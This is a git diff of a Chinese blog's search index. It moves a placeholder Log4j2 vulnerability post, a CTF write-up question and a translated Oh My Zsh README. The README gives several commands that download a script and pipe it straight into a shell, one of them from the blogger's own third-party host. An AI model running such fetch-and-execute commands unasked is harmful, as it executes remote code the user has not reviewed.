-        <tag>software</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PYTHON PROGRAM-GUIDE</title>
     <url>/2022/03/17/PYTHON-PROGRAM-GUIDE/</url>
     <content><![CDATA[<ul>
@@ -1846,8 +1846,8 @@
         <category>网络安全</category>
       </categories>
       <tags>
-        <tag>编程语言</tag>
         <tag>程序开发安全</tag>
+        <tag>编程语言</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -2387,6 +2387,18 @@
       </tags>
   </entry>
   <entry>
+    <title>【高危】Log4j2漏洞分析&amp;复现</title>
+    <url>/2021/12/10/log4j2-1/</url>
+    <content><![CDATA[<h1 id="暂不公开，敬请期待-👋"><a href="#暂不公开，敬请期待-👋" class="headerlink" title="暂不公开，敬请期待 👋"></a>暂不公开，敬请期待 👋</h1>]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【WRITEUP】第六届蓝帽杯</title>
     <url>/2022/07/09/lanmao-wp/</url>
     <content><![CDATA[<h3 id="题目序号2-Domainhacker"><a href="#题目序号2-Domainhacker" class="headerlink" title="题目序号2 Domainhacker"></a>题目序号2 Domainhacker</h3><p>公司安全部门，在流量设备中发现了疑似黑客入侵的痕迹，用户似乎获取了机器的hash，你能通过分析流量，找到机器的hash吗？</p>
@@ -2471,167 +2483,6 @@
         <tag>CTF</tag>
         <tag>蓝帽杯</tag>
         <tag>取证技术</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【高危】Log4j2漏洞分析&amp;复现</title>
-    <url>/2021/12/10/log4j2-1/</url>
-    <content><![CDATA[<h1 id="暂不公开，敬请期待-👋"><a href="#暂不公开，敬请期待-👋" class="headerlink" title="暂不公开，敬请期待 👋"></a>暂不公开，敬请期待 👋</h1>]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>README For Oh My Zsh</title>
-    <url>/2022/04/28/ohmyzsh-readme/</url>
-    <content><![CDATA[<h1 id="关于Oh-My-Zsh"><a href="#关于Oh-My-Zsh" class="headerlink" title="关于Oh My Zsh"></a>关于Oh My Zsh</h1><p>Oh My Zsh是一个开源的，社区驱动的框架，用于管理<a href="https://www.zsh.org/">您的zsh</a>配置。</p>
-<p>听起来很无聊。让我们再试一次。</p>
-<p><strong>哦，我的Zsh不会让你成为10x开发人员…但你可能会觉得自己像一个。</strong></p>
-<p>一旦安装，您的终端外壳将成为镇上的话题<em>或您的钱回来！</em>在命令提示符下每次击键时，您都将利用数百个功能强大的插件和精美的主题。陌生人会在咖啡馆里走到你面前，问你<em>：“这太神奇了！你是某种天才吗？</em></p>
-<p>最后，你将开始得到你一直觉得自己应得的那种关注。…或者，也许您将利用节省的时间更频繁地开始使用牙线。😬</p>
-<p>要了解更多信息，请访问  <a href="https://ohmyz.sh/">ohmyz.sh</a>，在Twitter上关注<a href="https://twitter.com/ohmyzsh">@ohmyzsh</a>，并在<a href="https://discord.gg/ohmyzsh">Discord</a>上加入我们。</p>
-<p><a href="https://github.com/ohmyzsh/ohmyzsh/actions?query=workflow:CI"><img src="https://github.com/ohmyzsh/ohmyzsh/workflows/CI/badge.svg" alt="词"></a>  <a href="https://twitter.com/intent/follow?screen_name=ohmyzsh"><img src="https://camo.githubusercontent.com/11a416635f3d1f03b7a97eac9d92f96b165ffe65a18199d50503e1e5f3c7b633/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6f686d797a73683f6c6162656c3d466f6c6c6f772b406f686d797a7368267374796c653d666c6174" alt="关注@ohmyzsh"></a><a href="https://discord.gg/ohmyzsh"><img src="https://camo.githubusercontent.com/64e8b917c8acd4f1b4c183948adc71b474cd574e5b36882f06c13631ad57ec6f/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f363432343936383636343037323834373436" alt="不和谐服务器"></a><a href="https://gitpod.io/#https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/eed956a921d6c38546e378ad7ee005b423b76361eef47db35b6afb2c71c8a090/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f476974706f642d72656164792d626c75653f6c6f676f3d676974706f64" alt="Gitpod ready"></a><a href="https://huntr.dev/bounties/disclose/?utm_campaign=ohmyzsh/ohmyzsh&utm_medium=social&utm_source=github&target=https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/30c28e8a19d49b9af85a85ca1c2911731b9659e2e8596315faf92162888f162f/68747470733a2f2f63646e2e68756e74722e6465762f68756e74725f73656375726974795f62616467655f6d6f6e6f2e737667" alt="huntr.dev"></a></p>
-<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-started"></a>开始</h2><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#prerequisites"></a>先决条件</h3><ul>
-<li>类Unix操作系统：macOS，Linux，BSD。在Windows上：WSL2是首选，但cygwin或msys也大多工作。</li>
-<li>应该安装<a href="https://www.zsh.org/">Zsh</a>（v4.3.9或更新的版本很好，但我们更喜欢5.0.8及更高版本）。如果未预安装（运行以确认），请在此处查看以下wiki说明：<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">安装ZSH</a><code>zsh --version</code></li>
-<li><code>curl</code>或应安装<code>wget</code></li>
-<li><code>git</code>应安装（建议使用 v2.4.11 或更高版本）</li>
-</ul>
-<h3 id="基本安装"><a href="#基本安装" class="headerlink" title="基本安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#basic-installation"></a>基本安装</h3><p>Oh My Zsh 是通过在终端中运行以下命令之一来安装的。您可以通过命令行安装它，也可以使用 或其他类似工具。<code>curl``wget</code></p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>curl</strong></td>
-<td><code>sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
-</tr>
-<tr>
-<td><strong>wget</strong></td>
-<td><code>sh -c &quot;$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
-</tr>
-<tr>
-<td><strong>fetch</strong></td>
-<td><code>sh -c &quot;$(fetch -o - https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
-</tr>
-</tbody></table>
-<p><em>请注意，任何以前的  <code>.zshrc</code>  都将重命名为  <code>.zshrc.pre-oh-my-zsh</code>。安装后，可以将要保留的配置移动到新的  <code>.zshrc 中</code>。</em></p>
-<h4 id="手动检查"><a href="#手动检查" class="headerlink" title="手动检查"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-inspection"></a>手动检查</h4><p>最好从您还不知道的项目中检查安装脚本。为此，您可以先下载安装脚本，浏览它以使一切正常，然后运行它：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh</span><br><span class="line">sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h2 id="使用-Oh-My-Zsh"><a href="#使用-Oh-My-Zsh" class="headerlink" title="使用 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-oh-my-zsh"></a>使用 Oh My Zsh</h2><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#plugins"></a>插件</h3><p>哦，我的Zsh附带了大量插件供您利用。您可以查看<a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins">插件</a>目录和&#x2F;或<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">wiki</a>，以查看当前可用的内容。</p>
-<h4 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#enabling-plugins"></a>启用插件</h4><p>一旦你发现一个（或几个）你想与Oh My Zsh一起使用的插件，你就需要在文件中启用它们。您将在目录中找到 zshrc 文件。使用您喜欢的文本编辑器打开它，您将看到一个列出要加载的所有插件的位置。<code>.zshrc``$HOME</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<p>例如，这可能开始看起来像这样：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  bundler</span><br><span class="line">  dotenv</span><br><span class="line">  macos</span><br><span class="line">  rake</span><br><span class="line">  rbenv</span><br><span class="line">  ruby</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p><em>请注意，插件由空格（空格，制表符，新行…）分隔。<strong>不要在</strong>它们之间使用逗号，否则它会中断。</em></p>
-<h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-plugins"></a>使用插件</h4><p>每个内置插件都包含一个<strong>自述文件</strong>，用于记录它。此自述文件应显示别名（如果插件添加了任何别名）以及该特定插件中包含的其他好东西。</p>
-<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#themes"></a>主题</h3><p>我们承认这一点。在Oh My Zsh世界的早期，我们可能有点太快乐了。我们现在捆绑了一百五十多个主题。他们中的大多数在wiki上都有<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">屏幕截图</a>（我们正在努力更新这个！看看他们！</p>
-<h4 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#selecting-a-theme"></a>选择主题</h4><p><em>Robby的主题是默认主题。这不是最花哨的。这不是最简单的一个。这对他来说是正确的。</em></p>
-<p>找到要使用的主题后，您需要编辑该文件。您将在那里看到一个环境变量（全部大写），如下所示：<code>~/.zshrc</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br></pre></td></tr></table></figure>
-
-<p>要使用其他主题，只需更改值以匹配所需主题的名称即可。例如：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;agnoster&quot; # (this is one of the fancy ones)</span><br><span class="line"><span class="meta"># </span><span class="language-bash">see https://github.com/ohmyzsh/ohmyzsh/wiki/Themes<span class="comment">#agnoster</span></span></span><br></pre></td></tr></table></figure>
-
-<p><em>注意：许多主题需要安装  <a href="https://github.com/powerline/fonts">Powerline 字体</a> 或  <a href="https://github.com/ryanoasis/nerd-fonts">书字体</a> 才能正确呈现。没有它们，这些主题将呈现<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ#i-have-a-weird-character-in-my-prompt">奇怪的提示符号</a></em></p>
-<p>打开一个新的终端窗口，您的提示应如下所示：</p>
-<p><a href="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png"><img src="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png" alt="“阿格诺斯特”主题"></a></p>
-<p>如果您没有找到适合您需求的主题，请查看wiki以获取<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/External-themes">更多主题</a>。</p>
-<p>如果您感到精力充沛，每次打开新的终端窗口时，都可以让计算机为您随机选择一个。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;random&quot; # (...please let it be pie... please be some pie..)</span><br></pre></td></tr></table></figure>
-
-<p>如果您想从自己喜欢的主题列表中选择随机主题：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_CANDIDATES=(</span><br><span class="line">  &quot;robbyrussell&quot;</span><br><span class="line">  &quot;agnoster&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>如果您只知道自己不喜欢哪些主题，则可以将它们添加到忽略的列表中：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_IGNORED=(pygmalion tjkirch_mod)</span><br></pre></td></tr></table></figure>
-
-<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#faq"></a>常见问题</h3><p>如果您还有其他疑问或问题，可以在我们的<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ">常见问题解答</a>中找到解决方案。</p>
-<h2 id="高级主题"><a href="#高级主题" class="headerlink" title="高级主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-topics"></a>高级主题</h2><p>如果你是那种喜欢亲自动手的人，这些部分可能会引起共鸣。</p>
-<h3 id="高级安装"><a href="#高级安装" class="headerlink" title="高级安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-installation"></a>高级安装</h3><p>某些用户可能希望手动安装 Oh My Zsh，或者更改默认路径或安装程序接受的其他设置（这些设置也记录在安装脚本的顶部）。</p>
-<h4 id="自定义目录"><a href="#自定义目录" class="headerlink" title="自定义目录"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-directory"></a>自定义目录</h4><p>默认位置是（隐藏在您的主目录中，您可以使用<code>~/.oh-my-zsh``cd ~/.oh-my-zsh</code>)</p>
-<p>如果要使用环境变量更改安装目录，请在安装之前运行，或在安装管道结束之前对其进行设置，如下所示：<code>ZSH``export ZSH=/your/path</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH=&quot;$HOME/.dotfiles/oh-my-zsh&quot; sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h4 id="无人参与安装"><a href="#无人参与安装" class="headerlink" title="无人参与安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#unattended-install"></a>无人参与安装</h4><p>如果您在自动安装过程中运行 Oh My Zsh 安装脚本，则可以将标志传递给该脚本。这将具有不尝试更改默认 shell 的效果，并且在安装完成后它也不会运行。<code>--unattended``install.sh``zsh</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; &quot;&quot; --unattended</span><br></pre></td></tr></table></figure>
-
-<h4 id="从分叉存储库安装"><a href="#从分叉存储库安装" class="headerlink" title="从分叉存储库安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installing-from-a-forked-repository"></a>从分叉存储库安装</h4><p>安装脚本还接受以下变量以允许安装不同的存储库：</p>
-<ul>
-<li><p><code>REPO</code>（默认值：）：其形式为 .如果设置此变量，安装程序将在 中查找存储库。<code>ohmyzsh/ohmyzsh``owner/repository``https://github.com/&#123;owner&#125;/&#123;repository&#125;</code></p>
-</li>
-<li><p><code>REMOTE</code>（默认值：）：这是 git 存储库克隆的完整 URL。如果要从不在 GitHub 上的分叉（GitLab、Bitbucket…）进行安装，或者要使用 SSH 而不是 HTTPS 进行克隆（），则可以使用此设置。<code>https://github.com/$&#123;REPO&#125;.git``git@github.com:user/project.git</code></p>
-<p>  <em>注意：它与设置  <code>REPO</code>  变量不兼容。此设置将优先。</em></p>
-</li>
-<li><p><code>BRANCH</code>（默认值：）：如果要在克隆存储库时更改要签出的默认分支，则可以使用此设置。这对于测试拉取请求或要使用 以外的分支可能很有用。<code>master``master</code></p>
-</li>
-</ul>
-<p>例如：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">REPO=apjanke/oh-my-zsh BRANCH=edge sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-installation"></a>手动安装</h4><h5 id="1-克隆存储库"><a href="#1-克隆存储库" class="headerlink" title="1. 克隆存储库"></a><a href="https://github.com/ohmyzsh/ohmyzsh#1-clone-the-repository-"></a>1. 克隆存储库</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br></pre></td></tr></table></figure>
-
-<h5 id="2-可选，备份现有文件-zshrc"><a href="#2-可选，备份现有文件-zshrc" class="headerlink" title="2.可选，备份现有文件~/.zshrc"></a><a href="https://github.com/ohmyzsh/ohmyzsh#2-optionally-backup-your-existing-zshrc-file-"></a>2.<em>可选，</em>备份现有文件<code>~/.zshrc</code></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.zshrc ~/.zshrc.orig</span><br></pre></td></tr></table></figure>
-
-<h5 id="3-创建新的-zsh-配置文件"><a href="#3-创建新的-zsh-配置文件" class="headerlink" title="3. 创建新的 zsh 配置文件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#3-create-a-new-zsh-configuration-file-"></a>3. 创建新的 zsh 配置文件</h5><p>您可以通过复制我们为您包含的模板来创建新的 zsh 配置文件。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<h5 id="4-更改默认外壳"><a href="#4-更改默认外壳" class="headerlink" title="4. 更改默认外壳"></a><a href="https://github.com/ohmyzsh/ohmyzsh#4-change-your-default-shell-"></a>4. 更改默认外壳</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh -s $(which zsh)</span><br></pre></td></tr></table></figure>
-
-<p>您必须从用户会话注销并重新登录才能看到此更改。</p>
-<h5 id="5-初始化新的-zsh-配置"><a href="#5-初始化新的-zsh-配置" class="headerlink" title="5. 初始化新的 zsh 配置"></a><a href="https://github.com/ohmyzsh/ohmyzsh#5-initialize-your-new-zsh-configuration-"></a>5. 初始化新的 zsh 配置</h5><p>打开新的终端窗口后，它应该使用Oh My Zsh的配置加载zsh。</p>
-<h3 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installation-problems"></a>安装问题</h3><p>如果您安装任何打嗝，以下是一些常见的修复程序。</p>
-<ul>
-<li>如果在切换到 后无法找到某些命令，则<em>可能需要</em>修改 in。<code>PATH``~/.zshrc``oh-my-zsh</code></li>
-<li>如果手动安装或更改了安装位置，请检查 中的环境变量。<code>ZSH``~/.zshrc</code></li>
-</ul>
-<h3 id="自定义插件和主题"><a href="#自定义插件和主题" class="headerlink" title="自定义插件和主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-plugins-and-themes"></a>自定义插件和主题</h3><p>如果要覆盖任何默认行为，只需在目录中添加一个新文件（以 结尾）。<code>.zsh``custom/</code></p>
-<p>如果您有许多功能可以很好地组合在一起，则可以将它们作为文件放在目录中，然后启用此插件。<code>XYZ.plugin.zsh``custom/plugins/</code></p>
-<p>如果要覆盖使用 Oh My Zsh 分发的插件的功能，请在目录中创建一个同名的插件，该插件将被加载，而不是 .<code>custom/plugins/``plugins/</code></p>
-<h2 id="获取更新"><a href="#获取更新" class="headerlink" title="获取更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-updates"></a>获取更新</h2><p>默认情况下，系统将提示您每 2 周检查一次更新。您可以在<strong>加载Oh My Zsh之前</strong>，通过向文件添加一行来选择其他更新模式：<code>~/.zshrc</code></p>
-<ol>
-<li><p>自动更新，无确认提示：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode auto</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果有可用的更新，只需每隔几天提供一次提醒：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode reminder</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>要完全禁用自动更新：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode disabled</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>注意：您可以使用以下设置控制 Oh My Zsh 检查更新的频率：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every 7 days</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 7</span><br><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every time you open the terminal (not recommended)</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-updates"></a>手动更新</h3><p>如果你想在任何时间点更新（也许有人刚刚发布了一个新插件，你不想等一个星期？），你只需要运行：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure>
-
-<p>魔法！🎉</p>
-<h2 id="卸载-Oh-My-Zsh"><a href="#卸载-Oh-My-Zsh" class="headerlink" title="卸载 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#uninstalling-oh-my-zsh"></a>卸载 Oh My Zsh</h2><p>哦，我的Zsh并不适合所有人。我们会想念你的，但我们想让这很容易分手。</p>
-<p>如果要卸载 ，只需从命令行运行即可。它将删除自身并还原以前的配置或配置。<code>oh-my-zsh``uninstall_oh_my_zsh``bash``zsh</code></p>
-<h2 id="【推荐】国内脚本配置安装"><a href="#【推荐】国内脚本配置安装" class="headerlink" title="【推荐】国内脚本配置安装"></a>【推荐】国内脚本配置安装</h2><p>考虑到官方方法，需要连接GitHub；如果你的设备无法有效访问GitHub。可以使用我配置的脚本：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zsh -c &quot;$(curl -fsSL &#x27;https://api.host.mintimate.cn/fileHost/public/download/1P0R&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-<p>为了保证脚本能顺利运行，你的Linux&#x2F;Mac服务器需要：</p>
-<blockquote>
-<p>提前安装curl、unzip,如果有~&#x2F;.zshrc文件，最好提前备份，否则本脚本自动更改原本的.zshrc文件为zshrcBak</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>开源项目</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>tools</tag>
-        <tag>wiki</tag>
       </tags>
   </entry>
   <entry>
@@ -2988,6 +2839,155 @@
       </tags>
   </entry>
   <entry>
+    <title>README For Oh My Zsh</title>
+    <url>/2022/04/28/ohmyzsh-readme/</url>
+    <content><![CDATA[<h1 id="关于Oh-My-Zsh"><a href="#关于Oh-My-Zsh" class="headerlink" title="关于Oh My Zsh"></a>关于Oh My Zsh</h1><p>Oh My Zsh是一个开源的，社区驱动的框架，用于管理<a href="https://www.zsh.org/">您的zsh</a>配置。</p>
+<p>听起来很无聊。让我们再试一次。</p>
+<p><strong>哦，我的Zsh不会让你成为10x开发人员…但你可能会觉得自己像一个。</strong></p>
+<p>一旦安装，您的终端外壳将成为镇上的话题<em>或您的钱回来！</em>在命令提示符下每次击键时，您都将利用数百个功能强大的插件和精美的主题。陌生人会在咖啡馆里走到你面前，问你<em>：“这太神奇了！你是某种天才吗？</em></p>
+<p>最后，你将开始得到你一直觉得自己应得的那种关注。…或者，也许您将利用节省的时间更频繁地开始使用牙线。😬</p>
+<p>要了解更多信息，请访问  <a href="https://ohmyz.sh/">ohmyz.sh</a>，在Twitter上关注<a href="https://twitter.com/ohmyzsh">@ohmyzsh</a>，并在<a href="https://discord.gg/ohmyzsh">Discord</a>上加入我们。</p>
+<p><a href="https://github.com/ohmyzsh/ohmyzsh/actions?query=workflow:CI"><img src="https://github.com/ohmyzsh/ohmyzsh/workflows/CI/badge.svg" alt="词"></a>  <a href="https://twitter.com/intent/follow?screen_name=ohmyzsh"><img src="https://camo.githubusercontent.com/11a416635f3d1f03b7a97eac9d92f96b165ffe65a18199d50503e1e5f3c7b633/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6f686d797a73683f6c6162656c3d466f6c6c6f772b406f686d797a7368267374796c653d666c6174" alt="关注@ohmyzsh"></a><a href="https://discord.gg/ohmyzsh"><img src="https://camo.githubusercontent.com/64e8b917c8acd4f1b4c183948adc71b474cd574e5b36882f06c13631ad57ec6f/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f363432343936383636343037323834373436" alt="不和谐服务器"></a><a href="https://gitpod.io/#https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/eed956a921d6c38546e378ad7ee005b423b76361eef47db35b6afb2c71c8a090/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f476974706f642d72656164792d626c75653f6c6f676f3d676974706f64" alt="Gitpod ready"></a><a href="https://huntr.dev/bounties/disclose/?utm_campaign=ohmyzsh/ohmyzsh&utm_medium=social&utm_source=github&target=https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/30c28e8a19d49b9af85a85ca1c2911731b9659e2e8596315faf92162888f162f/68747470733a2f2f63646e2e68756e74722e6465762f68756e74725f73656375726974795f62616467655f6d6f6e6f2e737667" alt="huntr.dev"></a></p>
+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-started"></a>开始</h2><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#prerequisites"></a>先决条件</h3><ul>
+<li>类Unix操作系统：macOS，Linux，BSD。在Windows上：WSL2是首选，但cygwin或msys也大多工作。</li>
+<li>应该安装<a href="https://www.zsh.org/">Zsh</a>（v4.3.9或更新的版本很好，但我们更喜欢5.0.8及更高版本）。如果未预安装（运行以确认），请在此处查看以下wiki说明：<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">安装ZSH</a><code>zsh --version</code></li>
+<li><code>curl</code>或应安装<code>wget</code></li>
+<li><code>git</code>应安装（建议使用 v2.4.11 或更高版本）</li>
+</ul>
+<h3 id="基本安装"><a href="#基本安装" class="headerlink" title="基本安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#basic-installation"></a>基本安装</h3><p>Oh My Zsh 是通过在终端中运行以下命令之一来安装的。您可以通过命令行安装它，也可以使用 或其他类似工具。<code>curl``wget</code></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>curl</strong></td>
+<td><code>sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
+</tr>
+<tr>
+<td><strong>wget</strong></td>
+<td><code>sh -c &quot;$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
+</tr>
+<tr>
+<td><strong>fetch</strong></td>
+<td><code>sh -c &quot;$(fetch -o - https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
+</tr>
+</tbody></table>
+<p><em>请注意，任何以前的  <code>.zshrc</code>  都将重命名为  <code>.zshrc.pre-oh-my-zsh</code>。安装后，可以将要保留的配置移动到新的  <code>.zshrc 中</code>。</em></p>
+<h4 id="手动检查"><a href="#手动检查" class="headerlink" title="手动检查"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-inspection"></a>手动检查</h4><p>最好从您还不知道的项目中检查安装脚本。为此，您可以先下载安装脚本，浏览它以使一切正常，然后运行它：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh</span><br><span class="line">sh install.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用-Oh-My-Zsh"><a href="#使用-Oh-My-Zsh" class="headerlink" title="使用 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-oh-my-zsh"></a>使用 Oh My Zsh</h2><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#plugins"></a>插件</h3><p>哦，我的Zsh附带了大量插件供您利用。您可以查看<a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins">插件</a>目录和&#x2F;或<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">wiki</a>，以查看当前可用的内容。</p>
+<h4 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#enabling-plugins"></a>启用插件</h4><p>一旦你发现一个（或几个）你想与Oh My Zsh一起使用的插件，你就需要在文件中启用它们。您将在目录中找到 zshrc 文件。使用您喜欢的文本编辑器打开它，您将看到一个列出要加载的所有插件的位置。<code>.zshrc``$HOME</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi ~/.zshrc</span><br></pre></td></tr></table></figure>
+
+<p>例如，这可能开始看起来像这样：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  bundler</span><br><span class="line">  dotenv</span><br><span class="line">  macos</span><br><span class="line">  rake</span><br><span class="line">  rbenv</span><br><span class="line">  ruby</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><em>请注意，插件由空格（空格，制表符，新行…）分隔。<strong>不要在</strong>它们之间使用逗号，否则它会中断。</em></p>
